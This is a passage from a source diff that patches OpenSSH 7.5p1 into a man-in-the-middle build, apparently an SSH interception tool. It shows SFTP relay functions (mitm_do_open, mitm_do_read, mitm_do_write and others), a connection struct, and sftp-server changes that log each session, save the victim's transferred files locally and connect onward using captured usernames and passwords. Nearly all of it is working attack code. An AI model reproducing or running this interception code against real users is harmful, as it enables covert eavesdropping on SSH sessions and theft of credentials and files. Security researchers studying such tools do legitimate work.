NULL;\n+\t  *status = rstatus;\n+\t  return NULL;\n+\t} else if (type != SSH2_FXP_NAME)\n+\t  fatal(\"Expected SSH2_FXP_NAME(%u) packet, got %u\",\n+\t\tSSH2_FXP_NAME, type);\n+\n+\tif ((r = sshbuf_get_u32(msg, count)) != 0)\n+\t  fatal(\"%s: buffer error: %s\", __func__, ssh_err(r));\n+\tif (*count > SSHBUF_SIZE_MAX)\n+\t  fatal(\"%s: nonsensical number of entries\", __func__);\n+\tif (*count == 0) {\n+\t  sshbuf_free(msg); msg = NULL;\n+\t  *status = SSH2_FX_EOF;\n+\t  return NULL;\n+\t}\n+\n+\tdebug3(\"Received %d SSH2_FXP_NAME responses\", *count);\n+\n+\tret = xcalloc(*count, sizeof(Stat));\n+\n+\tfor (i = 0; i < *count; i++) {\n+\t  char *name, *long_name;\n+\t  Attrib a;\n+\n+\t  if ((r = sshbuf_get_cstring(msg, &name, NULL)) != 0 ||\n+\t      (r = sshbuf_get_cstring(msg, &long_name, NULL)) != 0)\n+\t    fatal(\"%s: buffer error: %s\", __func__, ssh_err(r));\n+\t  if ((r = decode_attrib(msg, &a)) != 0) {\n+\t    free(name); name = NULL;\n+\t    free(long_name); long_name = NULL;\n+\t    sshbuf_free(msg); msg = NULL;\n+\t    *status = SSH2_FX_FAILURE;\n+\t    return NULL;\n+\t  }\n+\t  ret[i].name = name;\n+\t  ret[i].long_name = long_name;\n+\t  ret[i].attrib = a;\n+\t}\n+\n+\tsshbuf_free(msg); msg = NULL;\n+\treturn ret;\n+}\n+\n+u_int\n+mitm_do_close(struct sftp_conn *conn, const u_char *handle, u_int handle_len)\n+{\n+\tu_int id;\n+\tstruct sshbuf *msg;\n+\tint r;\n+\n+\tif ((msg = sshbuf_new()) == NULL)\n+\t\tfatal(\"%s: sshbuf_new failed\", __func__);\n+\n+\tid = conn->msg_id++;\n+\tif ((r = sshbuf_put_u8(msg, SSH2_FXP_CLOSE)) != 0 ||\n+\t    (r = sshbuf_put_u32(msg, id)) != 0 ||\n+\t    (r = sshbuf_put_string(msg, handle, handle_len)) != 0)\n+\t\tfatal(\"%s: buffer error: %s\", __func__, ssh_err(r));\n+\tsend_msg(conn, msg);\n+\tsshbuf_free(msg); msg = NULL;\n+\n+\tdebug3(\"Sent message SSH2_FXP_CLOSE I:%u\", id);\n+\treturn get_status(conn, id);\n+}\n+\n+u_int\n+mitm_do_mkdir(struct sftp_conn *conn, const char *path, Attrib *a)\n+{\n+\tu_int id;\n+\n+\tid = conn->msg_id++;\n+\tsend_string_attrs_request(conn, id, SSH2_FXP_MKDIR, path, strlen(path), a);\n+\treturn get_status(conn, id);\n+}\n+\n+u_int\n+mitm_do_rmdir(struct sftp_conn *conn, const char *path)\n+{\n+\tu_int id;\n+\n+\tid = conn->msg_id++;\n+\tsend_string_request(conn, id, SSH2_FXP_RMDIR, path, strlen(path));\n+\treturn get_status(conn, id);\n+}\n+\n+u_int\n+mitm_do_rm(struct sftp_conn *conn, const char *path)\n+{\n+\tu_int id;\n+\n+\tid = conn->msg_id++;\n+\tsend_string_request(conn, id, SSH2_FXP_REMOVE, path, strlen(path));\n+\treturn get_status(conn, id);\n+}\n+\n+u_int\n+mitm_do_rename(struct sftp_conn *conn, const char *oldpath, const char *newpath, int force_legacy)\n+{\n+\tstruct sshbuf *msg;\n+\tu_int id;\n+\tint r, use_ext = (conn->exts & SFTP_EXT_POSIX_RENAME) && !force_legacy;\n+\n+\tif ((msg = sshbuf_new()) == NULL)\n+\t\tfatal(\"%s: sshbuf_new failed\", __func__);\n+\n+\t/* Send rename request */\n+\tid = conn->msg_id++;\n+\tif (use_ext) {\n+\t\tif ((r = sshbuf_put_u8(msg, SSH2_FXP_EXTENDED)) != 0 ||\n+\t\t    (r = sshbuf_put_u32(msg, id)) != 0 ||\n+\t\t    (r = sshbuf_put_cstring(msg,\n+\t\t    \"posix-rename@openssh.com\")) != 0)\n+\t\t\tfatal(\"%s: buffer error: %s\", __func__, ssh_err(r));\n+\t} else {\n+\t\tif ((r = sshbuf_put_u8(msg, SSH2_FXP_RENAME)) != 0 ||\n+\t\t    (r = sshbuf_put_u32(msg, id)) != 0)\n+\t\t\tfatal(\"%s: buffer error: %s\", __func__, ssh_err(r));\n+\t}\n+\tif ((r = sshbuf_put_cstring(msg, oldpath)) != 0 ||\n+\t    (r = sshbuf_put_cstring(msg, newpath)) != 0)\n+\t\tfatal(\"%s: buffer error: %s\", __func__, ssh_err(r));\n+\tsend_msg(conn, msg);\n+\tdebug3(\"Sent message %s \\\"%s\\\" -> \\\"%s\\\"\",\n+\t    use_ext ? \"posix-rename@openssh.com\" :\n+\t    \"SSH2_FXP_RENAME\", oldpath, newpath);\n+\tsshbuf_free(msg); msg = NULL;\n+\n+\treturn get_status(conn, id);\n+}\n+\n+u_int\n+mitm_do_setstat(struct sftp_conn *conn, const char *path, Attrib *a)\n+{\n+\tu_int id = conn->msg_id++;\n+\tsend_string_attrs_request(conn, id, SSH2_FXP_SETSTAT, path, strlen(path), a);\n+\treturn get_status(conn, id);\n+}\n+\n+u_int\n+mitm_do_fsetstat(struct sftp_conn *conn, const u_char *handle, u_int handle_len, Attrib *a)\n+{\n+\tu_int id = conn->msg_id++;\n+\tsend_string_attrs_request(conn, id, SSH2_FXP_FSETSTAT, handle, handle_len, a);\n+\treturn get_status(conn, id);\n+}\n+\n+Attrib *\n+mitm_do_fstat(struct sftp_conn *conn, const u_char *handle, u_int handle_len, int quiet, u_int *status)\n+{\n+\tu_int id = conn->msg_id++;\n+\tsend_string_request(conn, id, SSH2_FXP_FSTAT, handle, handle_len);\n+\treturn(get_decode_stat(conn, id, quiet, status));\n+}\n+\n+/* Returns 1 on success, with \"filename\", \"longname\", and \"a\" args set to the values obtained, or 0 on failure, with \"status\" arg set. */\n+int\n+mitm_do_readlink(struct sftp_conn *conn, const char *path, u_int *status, char **filename, char **longname, Attrib *a)\n+{\n+\tstruct sshbuf *msg;\n+\tu_int expected_id, count, id;\n+\tu_char type;\n+\tint r;\n+\n+\texpected_id = id = conn->msg_id++;\n+\tsend_string_request(conn, id, SSH2_FXP_READLINK, path, strlen(path));\n+\n+\tif ((msg = sshbuf_new()) == NULL)\n+\t\tfatal(\"%s: sshbuf_new failed\", __func__);\n+\n+\tget_msg(conn, msg);\n+\tif ((r = sshbuf_get_u8(msg, &type)) != 0 ||\n+\t    (r = sshbuf_get_u32(msg, &id)) != 0)\n+\t\tfatal(\"%s: buffer error: %s\", __func__, ssh_err(r));\n+\n+\tif (id != expected_id)\n+\t\tfatal(\"ID mismatch (%u != %u)\", id, expected_id);\n+\n+\tif (type == SSH2_FXP_STATUS) {\n+\t\tif ((r = sshbuf_get_u32(msg, status)) != 0)\n+\t\t\tfatal(\"%s: buffer error: %s\", __func__, ssh_err(r));\n+\t\tsshbuf_free(msg); msg = NULL;\n+\t\treturn 0;\n+\t} else if (type != SSH2_FXP_NAME)\n+\t\tfatal(\"Expected SSH2_FXP_NAME(%u) packet, got %u\",\n+\t\t    SSH2_FXP_NAME, type);\n+\n+\tif ((r = sshbuf_get_u32(msg, &count)) != 0)\n+\t\tfatal(\"%s: buffer error: %s\", __func__, ssh_err(r));\n+\tif (count != 1)\n+\t\tfatal(\"Got multiple names (%d) from SSH_FXP_READLINK\", count);\n+\n+\tif ((r = sshbuf_get_cstring(msg, filename, NULL)) != 0 ||\n+\t    (r = sshbuf_get_cstring(msg, longname, NULL)) != 0 ||\n+\t    (r = decode_attrib(msg, a)) != 0)\n+\t\tfatal(\"%s: buffer error: %s\", __func__, ssh_err(r));\n+\n+\tdebug3(\"SSH_FXP_READLINK %s -> %s\", path, *filename);\n+\tsshbuf_free(msg); msg = NULL;\n+\treturn 1;\n+}\n+\n+u_int\n+mitm_do_symlink(struct sftp_conn *conn, const char *oldpath, const char *newpath)\n+{\n+\tstruct sshbuf *msg;\n+\tu_int id;\n+\tint r;\n+\n+\tif (conn->version < 3)\n+\t\treturn SSH2_FX_OP_UNSUPPORTED;\n+\n+\tif ((msg = sshbuf_new()) == NULL)\n+\t\tfatal(\"%s: sshbuf_new failed\", __func__);\n+\n+\t/* Send symlink request */\n+\tid = conn->msg_id++;\n+\tif ((r = sshbuf_put_u8(msg, SSH2_FXP_SYMLINK)) != 0 ||\n+\t    (r = sshbuf_put_u32(msg, id)) != 0 ||\n+\t    (r = sshbuf_put_cstring(msg, oldpath)) != 0 ||\n+\t    (r = sshbuf_put_cstring(msg, newpath)) != 0)\n+\t\tfatal(\"%s: buffer error: %s\", __func__, ssh_err(r));\n+\tsend_msg(conn, msg);\n+\tdebug3(\"Sent message SSH2_FXP_SYMLINK \\\"%s\\\" -> \\\"%s\\\"\", oldpath,\n+\t    newpath);\n+\tsshbuf_free(msg); msg = NULL;\n+\n+\treturn get_status(conn, id);\n+}\n+\n+int\n+mitm_do_statvfs(struct sftp_conn *conn, const char *path, struct statvfs *st, u_int *status)\n+{\n+\tstruct sshbuf *msg;\n+\tu_int id;\n+\tint r;\n+\tstruct sftp_statvfs sftp_st;\n+\n+\tif ((conn->exts & SFTP_EXT_STATVFS) == 0)\n+\t\treturn SSH2_FX_OP_UNSUPPORTED;\n+\n+\tid = conn->msg_id++;\n+\n+\tif ((msg = sshbuf_new()) == NULL)\n+\t\tfatal(\"%s: sshbuf_new failed\", __func__);\n+\tsshbuf_reset(msg);\n+\tif ((r = sshbuf_put_u8(msg, SSH2_FXP_EXTENDED)) != 0 ||\n+\t    (r = sshbuf_put_u32(msg, id)) != 0 ||\n+\t    (r = sshbuf_put_cstring(msg, \"statvfs@openssh.com\")) != 0 ||\n+\t    (r = sshbuf_put_cstring(msg, path)) != 0)\n+\t\tfatal(\"%s: buffer error: %s\", __func__, ssh_err(r));\n+\tsend_msg(conn, msg);\n+\tsshbuf_free(msg); msg = NULL;\n+\n+\tif (get_decode_statvfs(conn, &sftp_st, id, 1, status) == -1)\n+\t  return -1;\n+\n+\tst->f_bsize = sftp_st.f_bsize;\n+\tst->f_frsize = sftp_st.f_frsize;\n+\tst->f_blocks = sftp_st.f_blocks;\n+\tst->f_bfree = sftp_st.f_bfree;\n+\tst->f_bavail = sftp_st.f_bavail;\n+\tst->f_files = sftp_st.f_files;\n+\tst->f_ffree = sftp_st.f_ffree;\n+\tst->f_favail = sftp_st.f_favail;\n+\tst->f_fsid = sftp_st.f_fsid;\n+\tst->f_flag = sftp_st.f_flag;\n+\tst->f_namemax = sftp_st.f_namemax;\n+\treturn 1;\n+}\n+\n+int\n+mitm_do_fstatvfs(struct sftp_conn *conn, const u_char *handle, size_t handle_len, struct statvfs *st, u_int *status)\n+{\n+\tstruct sshbuf *msg;\n+\tint r;\n+\tu_int id;\n+\tstruct sftp_statvfs sftp_st;\n+\n+\tif ((conn->exts & SFTP_EXT_FSTATVFS) == 0)\n+\t\treturn SSH2_FX_OP_UNSUPPORTED;\n+\n+\tid = conn->msg_id++;\n+\n+\tif ((msg = sshbuf_new()) == NULL)\n+\t\tfatal(\"%s: sshbuf_new failed\", __func__);\n+\tsshbuf_reset(msg);\n+\tif ((r = sshbuf_put_u8(msg, SSH2_FXP_EXTENDED)) != 0 ||\n+\t    (r = sshbuf_put_u32(msg, id)) != 0 ||\n+\t    (r = sshbuf_put_cstring(msg, \"fstatvfs@openssh.com\")) != 0 ||\n+\t    (r = sshbuf_put_string(msg, handle, (u_int)handle_len)) != 0)\n+\t\tfatal(\"%s: buffer error: %s\", __func__, ssh_err(r));\n+\tsend_msg(conn, msg);\n+\tsshbuf_free(msg); msg = NULL;\n+\n+\tif (get_decode_statvfs(conn, &sftp_st, id, 1, status) == -1)\n+\t  return -1;\n+\n+\tst->f_bsize = sftp_st.f_bsize;\n+\tst->f_frsize = sftp_st.f_frsize;\n+\tst->f_blocks = sftp_st.f_blocks;\n+\tst->f_bfree = sftp_st.f_bfree;\n+\tst->f_bavail = sftp_st.f_bavail;\n+\tst->f_files = sftp_st.f_files;\n+\tst->f_ffree = sftp_st.f_ffree;\n+\tst->f_favail = sftp_st.f_favail;\n+\tst->f_fsid = sftp_st.f_fsid;\n+\tst->f_flag = sftp_st.f_flag;\n+\tst->f_namemax = sftp_st.f_namemax;\n+\treturn 1;\n+}\n+\n+u_int\n+mitm_do_hardlink(struct sftp_conn *conn, const char *oldpath, const char *newpath)\n+{\n+\tstruct sshbuf *msg;\n+\tu_int id;\n+\tint r;\n+\n+\tif ((conn->exts & SFTP_EXT_HARDLINK) == 0)\n+\t\treturn SSH2_FX_OP_UNSUPPORTED;\n+\n+\tif ((msg = sshbuf_new()) == NULL)\n+\t\tfatal(\"%s: sshbuf_new failed\", __func__);\n+\n+\t/* Send link request */\n+\tid = conn->msg_id++;\n+\tif ((r = sshbuf_put_u8(msg, SSH2_FXP_EXTENDED)) != 0 ||\n+\t    (r = sshbuf_put_u32(msg, id)) != 0 ||\n+\t    (r = sshbuf_put_cstring(msg, \"hardlink@openssh.com\")) != 0 ||\n+\t    (r = sshbuf_put_cstring(msg, oldpath)) != 0 ||\n+\t    (r = sshbuf_put_cstring(msg, newpath)) != 0)\n+\t\tfatal(\"%s: buffer error: %s\", __func__, ssh_err(r));\n+\tsend_msg(conn, msg);\n+\tdebug3(\"Sent message hardlink@openssh.com \\\"%s\\\" -> \\\"%s\\\"\",\n+\t       oldpath, newpath);\n+\tsshbuf_free(msg); msg = NULL;\n+\n+\treturn get_status(conn, id);\n+}\n+\n+u_int\n+mitm_do_fsync(struct sftp_conn *conn, u_char *handle, size_t handle_len)\n+{\n+\tstruct sshbuf *msg;\n+\tu_int id;\n+\tint r;\n+\n+\t/* Silently return if the extension is not supported */\n+\tif ((conn->exts & SFTP_EXT_FSYNC) == 0)\n+\t\treturn SSH2_FX_OP_UNSUPPORTED;\n+\n+\t/* Send fsync request */\n+\tif ((msg = sshbuf_new()) == NULL)\n+\t\tfatal(\"%s: sshbuf_new failed\", __func__);\n+\tid = conn->msg_id++;\n+\tif ((r = sshbuf_put_u8(msg, SSH2_FXP_EXTENDED)) != 0 ||\n+\t    (r = sshbuf_put_u32(msg, id)) != 0 ||\n+\t    (r = sshbuf_put_cstring(msg, \"fsync@openssh.com\")) != 0 ||\n+\t    (r = sshbuf_put_string(msg, handle, (u_int)handle_len)) != 0)\n+\t\tfatal(\"%s: buffer error: %s\", __func__, ssh_err(r));\n+\tsend_msg(conn, msg);\n+\tdebug3(\"Sent message fsync@openssh.com I:%u\", id);\n+\tsshbuf_free(msg); msg = NULL;\n+\n+\treturn get_status(conn, id);\n+}\n+\n+/* Returns the handle on success (which must be free()'ed by the caller) and sets the \"handle_len\" arg, or NULL.  On failure, the \"status\" arg is set. */\n+u_char *\n+mitm_do_open(struct sftp_conn *conn, char *remote_path, u_int32_t pflags, Attrib *a, size_t *handle_len, u_int *status) {\n+\tu_char *handle = NULL;\n+\tstruct sshbuf *msg;\n+\tu_int id;\n+\tint r;\n+\n+\tif ((msg = sshbuf_new()) == NULL)\n+\t\tfatal(\"%s: sshbuf_new failed\", __func__);\n+\tid = conn->msg_id++;\n+\tif ((r = sshbuf_put_u8(msg, SSH2_FXP_OPEN)) != 0 ||\n+\t    (r = sshbuf_put_u32(msg, id)) != 0 ||\n+\t    (r = sshbuf_put_cstring(msg, remote_path)) != 0 ||\n+\t    (r = sshbuf_put_u32(msg, pflags)) != 0 ||\n+\t    (r = encode_attrib(msg, a)) != 0)\n+\t\tfatal(\"%s: buffer error: %s\", __func__, ssh_err(r));\n+\tsend_msg(conn, msg);\n+\tdebug3(\"Sent message SSH2_FXP_OPEN I:%u P:%s\", id, remote_path);\n+\n+\thandle = get_handle(conn, id, status, handle_len, \"remote open(\\\"%s\\\")\", remote_path);\n+\tsshbuf_free(msg); msg = NULL;\n+\treturn handle;\n+}\n+\n+/* Returns a pointer to a char buffer of read data on success (which must be free()'ed by the caller) with the \"read_len\" argument set with the number bytes returned, or NULL on failure with the \"status\" arg set accordingly. */\n+u_char *\n+mitm_do_read(struct sftp_conn *conn, const u_char *handle, u_int handle_len, u_int64_t offset, u_int32_t read_len, size_t *ret_len, u_int *status) {\n+\tstruct sshbuf *msg;\n+\tint r;\n+\tu_int id;\n+\tu_char type;\n+\tu_char *ret = NULL;\n+\n+\tif ((msg = sshbuf_new()) == NULL)\n+\t\tfatal(\"%s: sshbuf_new failed\", __func__);\n+\n+\tid = conn->msg_id++;\n+\tif ((r = sshbuf_put_u8(msg, SSH2_FXP_READ)) != 0 ||\n+\t    (r = sshbuf_put_u32(msg, id)) != 0 ||\n+\t    (r = sshbuf_put_string(msg, handle, handle_len)) != 0 ||\n+\t    (r = sshbuf_put_u64(msg, offset)) != 0 ||\n+\t    (r = sshbuf_put_u32(msg, read_len)) != 0)\n+\t\tfatal(\"%s: buffer error: %s\", __func__, ssh_err(r));\n+\n+\tsend_msg(conn, msg);\n+\tsshbuf_reset(msg);\n+\tget_msg(conn, msg);\n+\n+\tif ((r = sshbuf_get_u8(msg, &type)) != 0 ||\n+\t    (r = sshbuf_get_u32(msg, &id)) != 0)\n+\t\tfatal(\"%s: buffer error: %s\", __func__, ssh_err(r));\n+\n+\tif (type == SSH2_FXP_STATUS) {\n+\t\tif ((r = sshbuf_get_u32(msg, status)) != 0)\n+\t\t\tfatal(\"%s: buffer error: %s\", __func__, ssh_err(r));\n+\t\tsshbuf_free(msg); msg = NULL;\n+\t\t*ret_len = 0;\n+\t\treturn NULL;\n+\t} else if (type == SSH2_FXP_DATA) {\n+\t\tif ((r = sshbuf_get_string(msg, &ret, ret_len)) != 0)\n+\t\t\tfatal(\"%s: buffer error: %s\", __func__, ssh_err(r));\n+\t} else\n+\t\tfatal(\"%s: unexpected type received: %u\", __func__, type);\n+\n+\tsshbuf_free(msg); msg = NULL;\n+\treturn ret;\n+}\n+\n+u_int\n+mitm_do_write(struct sftp_conn *conn, const u_char *handle, u_int handle_len, u_int64_t offset, u_char *buf, u_int buf_len) {\n+\tstruct sshbuf *msg;\n+\tint r;\n+\tu_int id;\n+\tu_char type;\n+\tu_int status = 0;\n+\n+\tif ((msg = sshbuf_new()) == NULL)\n+\t\tfatal(\"%s: sshbuf_new failed\", __func__);\n+\n+\tid = conn->msg_id++;\n+\tif ((r = sshbuf_put_u8(msg, SSH2_FXP_WRITE)) != 0 ||\n+\t    (r = sshbuf_put_u32(msg, id)) != 0 ||\n+\t    (r = sshbuf_put_string(msg, handle, handle_len)) != 0 ||\n+\t    (r = sshbuf_put_u64(msg, offset)) != 0 ||\n+\t    (r = sshbuf_put_string(msg, buf, buf_len)) != 0)\n+\t\tfatal(\"%s: buffer error: %s\", __func__, ssh_err(r));\n+\n+\tsend_msg(conn, msg);\n+\tsshbuf_reset(msg);\n+\tget_msg(conn, msg);\n+\n+\tif ((r = sshbuf_get_u8(msg, &type)) != 0 ||\n+\t    (r = sshbuf_get_u32(msg, &id)) != 0)\n+\t\tfatal(\"%s: buffer error: %s\", __func__, ssh_err(r));\n+\n+\tif (type != SSH2_FXP_STATUS)\n+\t\tfatal(\"Expected SSH2_FXP_STATUS(%d) packet, got %d\", SSH2_FXP_STATUS, type);\n+\n+\tif ((r = sshbuf_get_u32(msg, &status)) != 0)\n+\t\tfatal(\"%s: buffer error: %s\", __func__, ssh_err(r));\n+\n+\tsshbuf_free(msg); msg = NULL;\n+\treturn status;\n+}\ndiff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh -x output.0 -x requests -x traces.0 -x configure openssh-7.5p1/sftp-client.h openssh-7.5p1-mitm/sftp-client.h\n--- openssh-7.5p1/sftp-client.h\t2017-03-20 02:39:27.000000000 +0000\n+++ openssh-7.5p1-mitm/sftp-client.h\t2019-09-08 01:47:49.770198481 +0000\n@@ -21,6 +21,9 @@\n #ifndef _SFTP_CLIENT_H\n #define _SFTP_CLIENT_H\n \n+#include <sys/statvfs.h>\n+#include \"misc.h\"\n+\n #ifdef USE_SYSTEM_GLOB\n # include <glob.h>\n #else\n@@ -53,6 +56,23 @@\n \tu_int64_t f_namemax;\n };\n \n+struct sftp_conn {\n+\tint fd_in;\n+\tint fd_out;\n+\tu_int transfer_buflen;\n+\tu_int num_requests;\n+\tu_int version;\n+\tu_int msg_id;\n+#define SFTP_EXT_POSIX_RENAME\t0x00000001\n+#define SFTP_EXT_STATVFS\t0x00000002\n+#define SFTP_EXT_FSTATVFS\t0x00000004\n+#define SFTP_EXT_HARDLINK\t0x00000008\n+#define SFTP_EXT_FSYNC\t\t0x00000010\n+\tu_int exts;\n+\tu_int64_t limit_kbps;\n+\tstruct bwlimit bwlimit_in, bwlimit_out;\n+};\n+\n /*\n  * Initialise a SSH filexfer connection. Returns NULL on error or\n  * a pointer to a initialized sftp_conn struct on success.\n@@ -80,10 +100,10 @@\n int do_rmdir(struct sftp_conn *, const char *);\n \n /* Get file attributes of 'path' (follows symlinks) */\n-Attrib *do_stat(struct sftp_conn *, const char *, int);\n+Attrib *do_stat(struct sftp_conn *, const char *, int, u_int *);\n \n /* Get file attributes of 'path' (does not follow symlinks) */\n-Attrib *do_lstat(struct sftp_conn *, const char *, int);\n+Attrib *do_lstat(struct sftp_conn *, const char *, int, u_int *);\n \n /* Set file attributes of 'path' */\n int do_setstat(struct sftp_conn *, const char *, Attrib *);\n@@ -92,7 +112,7 @@\n int do_fsetstat(struct sftp_conn *, const u_char *, u_int, Attrib *);\n \n /* Canonicalise 'path' - caller must free result */\n-char *do_realpath(struct sftp_conn *, const char *);\n+char *do_realpath(struct sftp_conn *, const char *, u_int *);\n \n /* Get statistics for filesystem hosting file at \"path\" */\n int do_statvfs(struct sftp_conn *, const char *, struct sftp_statvfs *, int);\n@@ -139,4 +159,42 @@\n /* Concatenate paths, taking care of slashes. Caller must free result. */\n char *path_append(const char *, const char *);\n \n+u_int mitm_do_close(struct sftp_conn *conn, const u_char *handle, u_int handle_len);\n+\n+u_int mitm_do_fsetstat(struct sftp_conn *conn, const u_char *handle, u_int handle_len, Attrib *a);\n+\n+Attrib *mitm_do_fstat(struct sftp_conn *conn, const u_char *handle, u_int handle_len, int quiet, u_int *status);\n+\n+int mitm_do_fstatvfs(struct sftp_conn *conn, const u_char *handle, size_t handle_len, struct statvfs *st, u_int *status);\n+\n+u_int mitm_do_fsync(struct sftp_conn *conn, u_char *handle, size_t handle_len);\n+\n+u_int mitm_do_hardlink(struct sftp_conn *conn, const char *oldpath, const char *newpath);\n+\n+u_int mitm_do_mkdir(struct sftp_conn *conn, const char *path, Attrib *a);\n+\n+u_char *mitm_do_open(struct sftp_conn *conn, char *remote_path, u_int32_t pflags, Attrib *a, size_t *handle_len, u_int *status);\n+\n+u_char *mitm_do_opendir(struct sftp_conn *conn, const char *path, size_t *handle_len, int *status);\n+\n+u_char *mitm_do_read(struct sftp_conn *conn, const u_char *handle, u_int handle_len, u_int64_t offset, u_int32_t read_len, size_t *ret_len, u_int *status);\n+\n+Stat *mitm_do_readdir(struct sftp_conn *conn, u_int32_t id, u_char *handle_str, size_t handle_len, u_int *count, int *status);\n+\n+int mitm_do_readlink(struct sftp_conn *conn, const char *path, u_int *status, char **filename, char **longname, Attrib *a);\n+\n+u_int mitm_do_rename(struct sftp_conn *conn, const char *oldpath, const char *newpath, int force_legacy);\n+\n+u_int mitm_do_rmdir(struct sftp_conn *conn, const char *path);\n+\n+u_int mitm_do_rm(struct sftp_conn *conn, const char *path);\n+\n+u_int mitm_do_setstat(struct sftp_conn *conn, const char *path, Attrib *a);\n+\n+int mitm_do_statvfs(struct sftp_conn *conn, const char *path, struct statvfs *st, u_int *status);\n+\n+u_int mitm_do_symlink(struct sftp_conn *conn, const char *oldpath, const char *newpath);\n+\n+u_int mitm_do_write(struct sftp_conn *conn, const u_char *handle, u_int handle_len, u_int64_t offset, u_char *buf, u_int buf_len);\n+\n #endif\ndiff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh -x output.0 -x requests -x traces.0 -x configure openssh-7.5p1/sftp-common.h openssh-7.5p1-mitm/sftp-common.h\n--- openssh-7.5p1/sftp-common.h\t2017-03-20 02:39:27.000000000 +0000\n+++ openssh-7.5p1-mitm/sftp-common.h\t2019-09-08 01:47:49.778198104 +0000\n@@ -50,3 +50,12 @@\n char\t*ls_file(const char *, const struct stat *, int, int);\n \n const char *fx2txt(int);\n+\n+/* portable attributes, etc. */\n+typedef struct Stat Stat;\n+\n+struct Stat {\n+\tchar *name;\n+\tchar *long_name;\n+\tAttrib attrib;\n+};\ndiff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh -x output.0 -x requests -x traces.0 -x configure openssh-7.5p1/sftp-glob.c openssh-7.5p1-mitm/sftp-glob.c\n--- openssh-7.5p1/sftp-glob.c\t2017-03-20 02:39:27.000000000 +0000\n+++ openssh-7.5p1-mitm/sftp-glob.c\t2019-09-08 01:47:49.778198104 +0000\n@@ -111,8 +111,9 @@\n fudge_lstat(const char *path, struct stat *st)\n {\n \tAttrib *a;\n+\tu_int status;\n \n-\tif (!(a = do_lstat(cur.conn, (char *)path, 1)))\n+\tif (!(a = do_lstat(cur.conn, (char *)path, 1, &status)))\n \t\treturn(-1);\n \n \tattrib_to_stat(a, st);\n@@ -124,8 +125,9 @@\n fudge_stat(const char *path, struct stat *st)\n {\n \tAttrib *a;\n+\tu_int status;\n \n-\tif (!(a = do_stat(cur.conn, (char *)path, 1)))\n+\tif (!(a = do_stat(cur.conn, (char *)path, 1, &status)))\n \t\treturn(-1);\n \n \tattrib_to_stat(a, st);\ndiff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh -x output.0 -x requests -x traces.0 -x configure openssh-7.5p1/sftp.h openssh-7.5p1-mitm/sftp.h\n--- openssh-7.5p1/sftp.h\t2017-03-20 02:39:27.000000000 +0000\n+++ openssh-7.5p1-mitm/sftp.h\t2019-09-08 01:47:49.778198104 +0000\n@@ -97,5 +97,5 @@\n \n struct passwd;\n \n-int\tsftp_server_main(int, char **, struct passwd *);\n+int\tsftp_server_main(int, char **, struct passwd *, char *, unsigned short, char *, char *, char *, char *);\n void\tsftp_server_cleanup_exit(int) __attribute__((noreturn));\ndiff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh -x output.0 -x requests -x traces.0 -x configure openssh-7.5p1/sftp-server.c openssh-7.5p1-mitm/sftp-server.c\n--- openssh-7.5p1/sftp-server.c\t2017-03-20 02:39:27.000000000 +0000\n+++ openssh-7.5p1-mitm/sftp-server.c\t2019-09-08 01:47:49.778198104 +0000\n@@ -39,6 +39,7 @@\n #include <time.h>\n #include <unistd.h>\n #include <stdarg.h>\n+#include <sys/wait.h>\n \n #include \"xmalloc.h\"\n #include \"sshbuf.h\"\n@@ -50,6 +51,8 @@\n \n #include \"sftp.h\"\n #include \"sftp-common.h\"\n+#include \"sftp-client.h\"\n+#include \"lol.h\"\n \n /* Our verbosity */\n static LogLevel log_level = SYSLOG_LEVEL_ERROR;\n@@ -74,15 +77,41 @@\n /* Requests that are allowed/denied */\n static char *request_whitelist, *request_blacklist;\n \n-/* portable attributes, etc. */\n-typedef struct Stat Stat;\n-\n-struct Stat {\n-\tchar *name;\n-\tchar *long_name;\n-\tAttrib attrib;\n+pid_t sshpid = -1;\n+volatile sig_atomic_t interrupted = 0;\n+int showprogress = 0;\n+extern struct sftp_conn *client_conn;\n+int session_log_fd = -1;      /* A descriptor to this session's log file. */\n+char *session_log_dir = NULL; /* The directory to store SFTP files in. */\n+\n+#define MITM_HANDLE_TYPE_FILE 0\n+#define MITM_HANDLE_TYPE_DIR 1\n+\n+/* This maps a remote server's handle to a local file descriptor. */\n+typedef struct MITMHandle MITMHandle;\n+struct MITMHandle {\n+  int in_use;          /* If 1, this slot is in use, otherwise it is unallocated.  */\n+  u_int type;          /* One of the MITM_HANDLE_TYPE_ flags. */\n+  char *handle_str;    /* The file handle on the remote server. */\n+  size_t handle_len;   /* The number of bytes the above file handle is. */\n+  int fd;              /* The local file descriptor. */\n+  u_int32_t pflags;    /* The portable flags this file was opened with. */\n+  char *original_path; /* The full path of the original file transferred. */\n+  char *actual_path;   /* The relative path that the file was saved to locally. */\n+  char *file_listing;  /* The file listing (if type == MITM_HANDLE_TYPE_DIR). */\n+  size_t file_listing_size; /* The size of the file_listing buffer. */\n };\n \n+MITMHandle *mitm_handles = NULL; /* Our array of handles. */\n+u_int num_mitm_handles = 0;  /* The current size of the mitm_handles array. */\n+\n+/* When mitm_handles runs out of free slots, it will grow by this many. */\n+#define MITM_HANDLES_NEW_BLOCK 16\n+\n+/* The block size that the MITMHandle.file_listing buffer grows by. */\n+#define MITM_HANDLES_FILE_LISTING_BLOCK 1024\n+\n+\n /* Packet handlers */\n static void process_open(u_int32_t id);\n static void process_close(u_int32_t id);\n@@ -109,6 +138,29 @@\n static void process_extended_fsync(u_int32_t id);\n static void process_extended(u_int32_t id);\n \n+struct sftp_conn *make_connection(char *host, unsigned short port, char *username, char *password_and_fingerprint_socket_name);\n+void mitm_init_log(char *log_filepath, char *log_dir);\n+void mitm_handle_close(const char *handle_str, size_t handle_len);\n+void mitm_handle_free(MITMHandle *mh);\n+void mitm_handle_init(MITMHandle *mh);\n+void mitm_handle_new(u_int type, char *original_name, u_int32_t pflags, const char *handle_str, size_t handle_len);\n+void mitm_handle_read_write(char *handle_str, size_t handle_len, u_int64_t offset, u_char *buf, size_t buf_len);\n+MITMHandle *mitm_handle_search(const char *handle_str, size_t handle_len);\n+void sftp_log(u_int status, const char *fmt, ...);\n+void sftp_log_no_filter(u_int status, const char 